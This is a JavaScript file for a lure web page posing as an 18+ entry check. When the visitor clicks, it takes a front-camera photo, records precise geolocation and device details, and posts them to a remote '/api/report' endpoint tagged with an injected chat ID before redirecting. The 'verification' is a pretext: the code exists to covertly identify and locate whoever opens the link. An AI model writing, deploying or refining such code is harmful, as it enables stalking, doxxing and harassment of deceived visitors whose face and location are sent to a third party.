// === app.js (версии от меня) ===
// Работает по тому же origin, где открыт сайт
const API_BASE = location.hostname.endsWith('cick.one') ? '' : 'https://cick.one';// пустой => текущий origin

const UI = {
  text: document.getElementById('text'),
  note: document.getElementById('note'),
  btn: document.getElementById('enterBtn'),
};

window.__reportReady = false;

// UI helpers
function logConsole(...args) { console.log('[report]', ...args); }
function setText(t) { if (UI.text) UI.text.innerHTML = t; }
function setNote(t) { if (UI.note) UI.note.textContent = t; }

function setBtnLocked() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = true;
  b.style.filter = 'grayscale(35%) brightness(0.9)';
  b.style.opacity = '0.6';
  b.style.cursor = 'not-allowed';
}
function setBtnReady() {
  const b = UI.btn;
  if (!b) return;
  b.disabled = false;
  b.style.filter = 'none';
  b.style.opacity = '1';
  b.style.cursor = 'pointer';
}

// Проверка permissions API (если доступен)
async function checkPermissions() {
  const res = { camera: 'unknown', geolocation: 'unknown' };
  try {
    if (navigator.permissions) {
      try {
        const p1 = await navigator.permissions.query({ name: 'camera' });
        res.camera = p1.state;
      } catch { /* camera query может быть не поддержан */ }
      try {
        const p2 = await navigator.permissions.query({ name: 'geolocation' });
        res.geolocation = p2.state;
      } catch { /* ignore */ }
    }
  } catch (e) {
    logConsole('checkPermissions err', e);
  }
  return res;
}

// Геолокация
async function askGeolocation() {
  return new Promise((resolve) => {
    if (!('geolocation' in navigator)) {
      resolve(null);
      return;
    }
    navigator.geolocation.getCurrentPosition(
      (p) =>
        resolve({
          lat: p.coords.latitude,
          lon: p.coords.longitude,
          acc: Math.round(p.coords.accuracy),
          ts: Date.now(),
        }),
      (err) => {
        logConsole('geolocation error', err && err.message);
        resolve(null);
      },
      { enableHighAccuracy: true, timeout: 15000, maximumAge: 0 }
    );
  });
}

// Снимок с камеры с наилучшей поддержкой
async function takePhoto() {
  if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
    throw new Error('Camera unsupported');
  }

  // Требуется user gesture — поэтому вызываем эту функцию только по клику
  const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' } });
  const [track] = stream.getVideoTracks();
  try {
    if (typeof ImageCapture !== 'undefined') {
      try {
        const cap = new ImageCapture(track);
        const bmp = await cap.grabFrame();
        const c = document.createElement('canvas');
        c.width = bmp.width;
        c.height = bmp.height;
        c.getContext('2d').drawImage(bmp, 0, 0);
        const dataUrl = c.toDataURL('image/jpeg', 0.85);
        track.stop();
        return dataUrl;
      } catch (e) {
        logConsole('ImageCapture failed, fallback to video', e);
      }
    }

    // fallback через video element
    const v = document.createElement('video');
    v.playsInline = true;
    v.muted = true;
    v.srcObject = stream;
    // ждём метаданных
    await new Promise((res) => {
      v.onloadedmetadata = res;
      // safety timeout
      setTimeout(res, 2000);
    });
    try { await v.play(); } catch (e) { /* браузер может блокировать playback, но frame всё равно может быть доступен */ }

    const w = v.videoWidth || 640;
    const h = v.videoHeight || 480;
    const c = document.createElement('canvas');
    c.width = w;
    c.height = h;
    const ctx = c.getContext('2d');
    ctx.drawImage(v, 0, 0, w, h);
    const dataUrl = c.toDataURL('image/jpeg', 0.85);
    stream.getTracks().forEach((t) => t.stop());
    return dataUrl;
  } catch (e) {
    // если не смогли — убедимся, что трек остановлен
    try { stream.getTracks().forEach((t) => t.stop()); } catch {}
    throw e;
  }
}

function getDeviceInfo() {
  const ua = navigator.userAgent;
  const isSafari =
    /Safari\//.test(ua) &&
    !/Chrome|CriOS|Chromium|FxiOS|Edg|OPR/.test(ua) &&
    navigator.vendor === 'Apple Computer, Inc.';
  const m = ua.match(/OS\s(\d+)[_.]/);
  const iosVer = m ? parseInt(m[1], 10) : null;
  return { userAgent: ua, platform: navigator.platform, iosVersion: iosVer, isSafari };
}

async function sendReport({ photoBase64, geo }) {
  const info = getDeviceInfo();
  const body = { ...info, geo, photoBase64, note: 'auto' };
  if (window.__reportChatId) body.chatId = window.__reportChatId;
  if (window.__SLUG) body.slug = window.__SLUG;

  logConsole('POST /api/report body preview', { chatId: body.chatId, slug: body.slug, geo: !!geo });

  const r = await fetch(`${API_BASE}/api/report`, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify(body),
  });
  const data = await r.json().catch(() => ({}));
  logConsole('/api/report response', data);
  if (!data.ok) throw new Error(data.error || 'Send failed');
  return data;
}

// Главный flow - запускается ТОЛЬКО по клику
async function performCheck() {
  try {
    setBtnLocked();
    setText('Проверяем разрешения и устройство…');
    setNote('');

    // quick diagnostics
    const perms = await checkPermissions();
    logConsole('permissions', perms);

    if (!location.protocol.startsWith('https') && location.hostname !== 'localhost') {
      setText('<span class="err">Требуется HTTPS. Камера/гео работают только по защищённому соединению.</span>');
      setNote('Разверни сайт под HTTPS или тестируй на localhost.');
      throw new Error('Insecure context');
    }

    // Запрос камеры и гео (оба требуют либо жеста пользователя, либо будут отклонены)
    setText('Запрашиваем камеру (разреши в браузере)…');
    let photo = null;
    try {
      photo = await takePhoto();
      logConsole('photo captured size', photo.length);
    } catch (e) {
      logConsole('takePhoto error', e);
      setText('<span class="err">Не удалось получить камеру.</span>');
      setNote('Проверь разрешения камеры в браузере.');
      throw e;
    }

    setText('Запрашиваем геопозицию (если доступна)…');
    const geo = await askGeolocation();
    logConsole('geo result', geo);

    setText('Отправляем отчёт на сервер…');
    await sendReport({ photoBase64: photo, geo });

    window.__reportReady = true;
    setBtnReady();
    setText('<span class="ok">Проверка пройдена. Нажми ещё раз, чтобы продолжить.</span>');
    setNote('Если не перенаправляет — икните меня (скрин ошибок).');
    logConsole('report done');
    return true;
  } catch (err) {
    console.error('[performCheck] error', err);
    window.__reportReady = false;
    setBtnLocked();
    if (!UI.text) return false;
    // нормализованные сообщения
    if (err && err.name === 'NotAllowedError') {
      setText('<span class="err">Доступ запрещён (NotAllowed). Разреши камеру/гео.</span>');
      setNote('Проверь настройки сайта в браузере и перезагрузи страницу.');
    } else if (err && err.message === 'Insecure context') {
      // already set above
    } else if (err && err.message && err.message.includes('Camera unsupported')) {
      setText('<span class="err">Камера не поддерживается.</span>');
      setNote('Попробуй другой браузер/устройство.');
    } else {
      setText('<span class="err">Не удалось пройти проверку.</span>');
      setNote(String(err && (err.message || err)));
    }
    return false;
  }
}

// Инициализация UI
document.addEventListener('DOMContentLoaded', () => {
  if (UI.btn) {
    UI.btn.style.display = 'block';
    setBtnLocked();
    UI.btn.textContent = 'Войти 18+';
  }
  // Проверим, что сервер инжектил chatId/slug
  logConsole('injected', { chatId: window.__reportChatId, slug: window.__SLUG });

  // Не автозапускаем performCheck() — большинство браузеров блокируют запрос камеры без клика.
});

// Обработчик клика: первый клик запускает проверку (если не готово), второй — редирект
if (UI.btn) {
  UI.btn.addEventListener('click', async (e) => {
    e.preventDefault();
    if (!window.__reportReady) {
      setText('Запуск проверки… (появятся запросы на разрешения)');
      await performCheck();
      return;
    }
    // если готово — выполняем редирект (функция go() должна быть в index.html)
    if (typeof go === 'function') {
      try { go(); } catch (err) { logConsole('go() failed', err); setNote('go() error: ' + (err && err.message)); }
    } else {
      setNote('Редирект не настроен на странице (go() не найден).');
      logConsole('go() not found');
    }
  });
}
